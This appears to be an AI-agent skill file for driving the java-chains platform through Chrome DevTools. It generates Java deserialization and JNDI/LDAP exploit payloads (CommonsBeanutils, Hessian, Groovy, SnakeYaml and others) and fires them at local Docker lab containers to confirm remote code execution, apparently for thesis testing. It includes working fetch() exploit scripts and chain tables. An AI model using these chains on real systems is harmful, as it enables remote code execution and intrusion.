# java-chains Skill

Operate the java-chains platform (vulhub Java Payload generation and vulnerability exploitation web platform).

## CRITICAL: Chrome DevTools MCP ONLY

**ALL API calls MUST use Chrome DevTools MCP `evaluate_script` with `fetch()`.**

- **NEVER use curl** — it gets 403 Forbidden (java-chains uses session/cookie auth)
- **NEVER use Bash curl for any java-chains or gateway API** — always use `mcp__chrome-devtools__evaluate_script`
- The browser session at `http://127.0.0.1:8011/` holds the authenticated cookies
- The gateway at `http://127.0.0.1:8080/` has `@CrossOrigin(origins = "*")`, so `fetch()` from the browser page works fine

## Platform Info

- URL: `http://127.0.0.1:8011/`
- Default credentials: admin / 1
- Login page: `http://127.0.0.1:8011/#/login`
- Gateway URL: `http://127.0.0.1:8080/`

## Login Flow (via Chrome DevTools MCP)

If not logged in:
1. Navigate to `http://127.0.0.1:8011/#/login`
2. Fill username "admin" and password "1"
3. Click login button

## Three Testing Methods (by Chain Type)

### Method 1: Standard Chains (NATIVE / HESSIAN / AMF)

**Page:** `http://127.0.0.1:8011/#/Generate/JavaNativePayload` (or Hessian2Payload, etc.)

**Workflow:** Generate payload via `/parse` API → Trigger via gateway `/api/trigger` → Verify RCE via `/api/exec`

**IMPORTANT:** Trigger response may show `"status": "ERROR"` with `InvocationTargetException` or `ClassCastException`. This is **NORMAL** — the command still executes. Always verify via `/api/exec` or `docker exec`.

```javascript
async () => {
  // 1. Generate payload
  const genResp = await fetch('/parse', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      payloadName: "JavaNativePayload",
      gadgetList: ["CommonsBeanutils1", "TemplatesImpl", "BytecodeConvert", "Exec"],
      params: {"Exec.cmd": "touch cb1_ok"},
      encode: "base64", urlEncoding: false, type: "Generate",
      downloadMode: false, saveFileMode: false, saveFileName: ""
    })
  });
  const genData = await genResp.json();
  if (!genData.status) return { error: "generate failed", details: genData };
  const payload = genData.data.payload;

  // 2. Trigger via gateway (ignore ERROR response — command still runs)
  const triggerResp = await fetch('http://127.0.0.1:8080/api/trigger', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chain: "CB1链", payload: payload })
  });

  // 3. Verify via exec endpoint (use Chrome MCP, NOT curl)
  await new Promise(r => setTimeout(r, 3000));
  const checkResp = await fetch('http://127.0.0.1:8080/api/exec/CB1%E9%93%BE?cmd=ls');
  const checkResult = await checkResp.json();
  return { rceVerified: checkResult.result && checkResult.result.includes("SUCCESS") };
}
```

### Method 2: JNDI Chains (JNDI_BASIC type)

**Page:** `http://127.0.0.1:8011/#/Generate/JavaNativePayload`

These chains generate serialized payloads that trigger JNDI lookups. Verification is by payload generation success only.

```javascript
async () => {
  const genResp = await fetch('/parse', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      payloadName: "JavaNativePayload",
      gadgetList: ["CommonsBeanutils1", "JndiRef", "JndiRefConvert"],
      params: {"JndiRef.url": "ldap://172.22.128.1:50389/test"},
      encode: "base64", urlEncoding: false, type: "Generate",
      downloadMode: false, saveFileMode: false, saveFileName: ""
    })
  });
  const genData = await genResp.json();
  if (!genData.status) return { error: "generate failed" };
  const payload = genData.data.payload;

  const triggerResp = await fetch('http://127.0.0.1:8080/api/trigger', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chain: "CB1 JNDI链1", payload: payload })
  });
  return await triggerResp.json();
}
```

### Method 3: JNDI Reference Chains (JNDI_REF / JNDIReferencePayload)

**Page:** `http://127.0.0.1:8011/#/JNDI/JNDIResourceRefPayload` (for TomcatEL/Groovy/SnakeYaml/BeanshellRef)
**Or:** `http://127.0.0.1:8011/#/JNDI/JNDIReferencePayload` (for HikariJdbcAttack, DruidJdbc, etc.)

These chains use the UI to build a gadget pipeline, generate an LDAP URL, and the target container does `InitialContext.lookup(jndiUrl)`.

**Steps:**
1. Navigate to the correct JNDI page
2. Build the gadget pipeline by clicking menu items (see pipeline tables below)
3. Set Exec.cmd parameter (e.g., `touch marker_file`)
4. Click "生成" to generate — output is LDAP/RMI URLs
5. Copy the LDAP URL (first line of output)
6. Base64-encode the LDAP URL and trigger via gateway
7. Verify RCE via `docker exec` (these containers have NO `/api/exec` endpoint)

**IMPORTANT:** Trigger response WILL show errors (`problem generating object using object factory`, `NullPointerException`, etc.). This is NORMAL — the command executes before the exception. **ALWAYS verify via `docker exec`.**

```javascript
async () => {
  const jndiUrl = "ldap://172.22.128.1:50389/<hash_from_output>";
  const payload = btoa(jndiUrl);
  const resp = await fetch('http://127.0.0.1:8080/api/trigger', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chain: "Groovy 脚本执行", payload: payload })
  });
  return await resp.json();
}
```

**Verification:** `docker exec <container_name>-env ls` — check if marker file was created.

## Gadget Pipeline Reference for JNDI Reference Chains

### JNDIResourceRefPayload (TomcatEL/Groovy/SnakeYaml/BeanshellRef)

| Chain | Pipeline (UI selection) |
|---|---|
| 经典 Tomcat EL 执行 | TomcatElRef → ElConvert → BytecodeConvert → Exec |
| Groovy 脚本执行 | GroovyShellRef → Groovy2Convert → BytecodeConvert → Exec |
| SnakeYaml 利用 | SnakeyamlRef → SnakeyamlJarSpi4JNDI → SnakeyamlJarConvert → BytecodeConvert → Exec |
| BeanshellRef 利用 | BeanshellRef → BeanshellConvert → BytecodeConvert → Exec |

### JNDIReferencePayload (HikariJdbcAttack/DruidJdbc etc.)

| Chain | Pipeline (UI selection) |
|---|---|
| HikariJdbcAttack Jdbc 利用 | HikariJdbcAttack → H2JavaJdbc2 → BytecodeConvert → Exec |
| Druid Jdbc 利用 | (preset available in dropdown) |

## UI Workflow for JNDI Reference Chains (Manual)

1. Navigate to the correct JNDI page (JNDIResourceRefPayload or JNDIReferencePayload)
2. Select the first gadget from the left menu (e.g., "GroovyShellRef" or "HikariJdbcAttack")
3. Click through each subsequent gadget in the sub-menus
4. For the last Exec gadget: expand it, change cmd from "calc" to `touch marker_file`
5. Click "生成" button — LDAP/RMI URLs appear in the output textarea
6. Copy the LDAP URL and trigger via gateway (Method 3)
7. Verify via `docker exec`

## Gadget Pipeline Reference for Standard Chains (Fixed Pipelines)

| Chain | Payload Type | Gadget Pipeline |
|---|---|---|
| K1二次反序列化2 | JavaNativePayload | CommonsCollectionsK1/RMIConnector/JavaNativeSerialization/CommonsCollectionsK1/TemplatesImpl/BytecodeConvert/Exec |
| Hessian二次反序列化 | Hessian2Payload | SwingLazyValueUIDefaults/LazyValueWithBcel/BcelConvert/BytecodeConvert/Exec |
| Fastjson C3p0 Jdbc h2 | JavaNativePayload | Jackson/DWrap/C3p0DataSource/H2JavaJdbc2/BytecodeConvert/Exec |
| Jackson C3p0 Jdbc h2 | JavaNativePayload | Jackson/DWrap/C3p0DataSource/H2JavaJdbc2/BytecodeConvert/Exec |
| C3P0反序列化1 | JavaNativePayload | MchangeC3p0Reference/TomcatElRef/ElConvert/BytecodeConvert/Exec |
| C3P0反序列化2 | JavaNativePayload | MchangeC3p0Reference/TomcatElRef/ElConvert/BytecodeConvert/Exec |

### Exec.cmd Convention

Use `touch <chainname>_ok` as the marker file (e.g., `touch cb1_ok`, `touch k1_ok`). For JNDI_REF chains, same convention but verify via `docker exec` instead of `/api/exec`.

## Chain Name → Container Mapping

| Chain Name | URL-encoded | Container | Controller Type | Verification |
|---|---|---|---|---|
| CB1链 | CB1%E9%93%BE | cb1 | NATIVE | /api/exec |
| CB2链 | CB2%E9%93%BE | cb2 | NATIVE | /api/exec |
| K1链 | K1%E9%93%BE | k1 | NATIVE | /api/exec |
| K2链 | K2%E9%93%BE | k2 | NATIVE | /api/exec |
| K3链 | K3%E9%93%BE | k3 | NATIVE | /api/exec |
| K4链 | K4%E9%93%BE | k4 | NATIVE | /api/exec |
| Fastjson链 | Fastjson%E9%93%BE | fastjson | NATIVE | /api/exec |
| Fastjson2链 | Fastjson2%E9%93%BE | fastjson2 | NATIVE | /api/exec |
| Jackson链 | Jackson%E9%93%BE | jackson | NATIVE | /api/exec |
| Fastjson C3p0 Jdbc h2链 | Fastjson%20C3p0%20Jdbc%20h2%E9%93%BE | fastjsonc3p0h2 | NATIVE | /api/exec |
| Jackson C3p0 Jdbc h2链 | Jackson%20C3p0%20Jdbc%20h2%E9%93%BE | jacksonc3p0h2 | NATIVE | /api/exec |
| K1链二次反序列化1 | K1%E9%93%BE%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961 | k1deser1 | NATIVE | /api/exec |
| K1链二次反序列化2 | K1%E9%93%BE%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962 | k1deser2 | NATIVE | /api/exec |
| Hessian XBean 链 | (via gateway) | hessianxbean | HESSIAN | /api/exec |
| Hessian Fastjson 链 | (via gateway) | hessianfastjson | HESSIAN | /api/exec |
| Hessian Jackson 链 | (via gateway) | hessianjackson | HESSIAN | /api/exec |
| 二次反序列化链 | (via gateway) | hessiandeser | HESSIAN | /api/exec |
| JDK原生链1 | (via gateway) | jdknative1 | HESSIAN | /api/exec |
| JDK原生BCEL链 | (via gateway) | jdkbcel | HESSIAN | /api/exec |
| Rome1低版本二次反序列化链 | (via gateway) | rome1 | HESSIAN | /api/exec |
| Rome2高版本二次反序列化链 | (via gateway) | rome2 | HESSIAN | /api/exec |
| Axis2链 | (via gateway) | axis2 | AMF | Sleep验证 |
| Xslt 代码执行 | (via gateway) | xslt | HESSIAN | /api/exec |
| CB1 JNDI链1 | CB1%20JNDI%E9%93%BE1 | cb1jndi1 | JNDI_BASIC | payload生成 |
| CB1 JNDI链2 | CB1%20JNDI%E9%93%BE2 | cb1jndi2 | JNDI_BASIC | payload生成 |
| Fastjson JNDI链 | Fastjson%20JNDI%E9%93%BE | fastjsonjndi | JNDI_BASIC | payload生成 |
| JDK原生JNDI链 | (via gateway) | jdkjndi | JNDI_BASIC | payload生成 |
| Spring JNDI链1 | (via gateway) | springjndi1 | HESSIAN | payload生成 |
| Spring JNDI链2 | (via gateway) | springjndi2 | HESSIAN | payload生成 |
| Spring 命令执行 | (via gateway) | springexec | HESSIAN | payload触发 |
| DNSLog探测类 | DNSLog%E6%8E%A2%E6%B5%8B%E7%B1%BB | dnslogclass | JNDI_BASIC | payload生成 |
| Druid Jdbc 利用 | (via gateway) | druidjdbc | JNDI_REF | docker exec |
| 命令执行 | (via gateway) | cmdexec | JNDI_BASIC | payload触发 |
| 反序列化炸弹 | %E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B8%E5%BC%B9 | deserbomb | JNDI_BASIC | payload触发 |
| 经典 Tomcat EL 执行 | (via gateway) | tomcatel | JNDI_REF | docker exec |
| Groovy 脚本执行 | (via gateway) | groovy | JNDI_REF | docker exec |
| SnakeYaml 利用 | (via gateway) | snakeyaml | JNDI_REF | docker exec |
| BeanshellRef 利用 | (via gateway) | beanshellref | JNDI_REF | docker exec |
| HikariJdbcAttack Jdbc 利用 | (via gateway) | hikarijdbc | JNDI_REF | docker exec |
| C3P0反序列化1 | (via gateway) | c3p01 | NATIVE | /api/exec |
| C3P0反序列化2 | (via gateway) | c3p02 | NATIVE | /api/exec |

## Verification Methods Summary

| Verification Method | When to Use | How |
|---|---|---|
| `/api/exec/{chain}?cmd=ls` | NATIVE/HESSIAN/AMF chains | Chrome MCP `fetch()` via gateway |
| `docker exec <container>-env ls` | JNDI_REF / JNDIReferencePayload chains | Bash `docker exec` |
| Payload generated | JNDI_BASIC chains | Check `/parse` response `status: true` |
| Sleep timing | Axis2链 | Measure elapsed time |
| Payload triggered | 命令执行, 反序列化炸弹, Spring命令执行 | Gateway trigger success |

## Gateway Exec Endpoint Bug

The gateway URL-encodes the `cmd` parameter but the target doesn't decode it. `/tmp/file` becomes `%2Ftmp%2Ffile`.

**Workaround:** Use simple filenames without paths:
- `touch cb1_ok` (not `touch /tmp/cb1_ok`)
- Verify with `ls` (no args) instead of `ls /tmp/cb1_ok`

## Chains to EXCLUDE from Thesis

- **INFO type (4):** JSP文件, Spring Bean Xml 加载字节码, SpringBoot charsets.jar生成, H2 Jdbc Url
- **JDK17 only (2):** JDK17 RCE链, JDK17 RCE链2

## Chains to SKIP in Testing

- JDK原生链2（慎用）: may crash JVM
- ReadFile: requires Fake MySQL server

## API Reference (all via Chrome MCP evaluate_script)

### Payload Generation
- `POST /parse` — Generate payload

### Information Queries
- `GET /gadget?payload={payloadName}` — List gadgets for a payload type
- `GET /getPayloadInfo?payloadName={name}` — Get payload details
- `GET /getGadgetInfo?gadgetName={name}` — Get gadget details with params
- `GET /defaultList` — Get all preset chain configurations
- `GET /version` — Get platform version

### Gateway APIs (http://127.0.0.1:8080/api/)
- `POST /api/trigger` — Send payload to target: `{chain: "链名", payload: "base64"}`
- `GET /api/exec/{chainName}?cmd={cmd}` — Execute command on target container
- `GET /api/health` — System health check
- `GET /api/chains` — List all chains
- `GET /api/chain-info/{chain}` — Chain details

## Payload Types (payloadName)

| Payload Type | Description |
|---|---|
| `JavaNativePayload` | Java ObjectInputStream deserialization |
| `Hessian2Payload` | Hessian2 deserialization |
| `Hessian2ToStringPayload` | Hessian2 exception toString |
| `HessianPayload` | Hessian1 deserialization |
| `BytecodePayload` | Bytecode generation (RCE/Sleep/MemShell/Echo) |
| `ShiroPayload` | Shiro deserialization |
| `ExpressionPayload` | Expression language payloads |
| `JDBCPayload` | JDBC attack payloads |
| `BlazeDSAMF3AMPayload` | BlazeDS AMF3 payloads |
| `JNDIResourceRefPayload` | JNDI ResourceRef (BeanFactory) — TomcatEL/Groovy/SnakeYaml/Beanshell |
| `JNDIReferencePayload` | JNDI Reference (ObjectFactory) — HikariJdbcAttack/DruidJdbc |

## Params Format

Key format: `{GadgetName}.{paramName}`. Examples:
- `{"Exec.cmd": "touch cb1_ok"}` — execute command
- `{"Sleep.sleepTime": "3"}` — sleep 3 seconds

## Encode Options

`raw`, `base64`, `hex`, `gzipbase64`

## Docker Container Management

- Max 10 containers at a time
- Start: `docker-compose up -d gateway cb1 cb2 k1 ...`
- Stop: `docker-compose stop cb1 cb2 k1 ...`
- Check: `docker ps --format "table {{.Names}}\t{{.Ports}}\t{{.Status}}"`
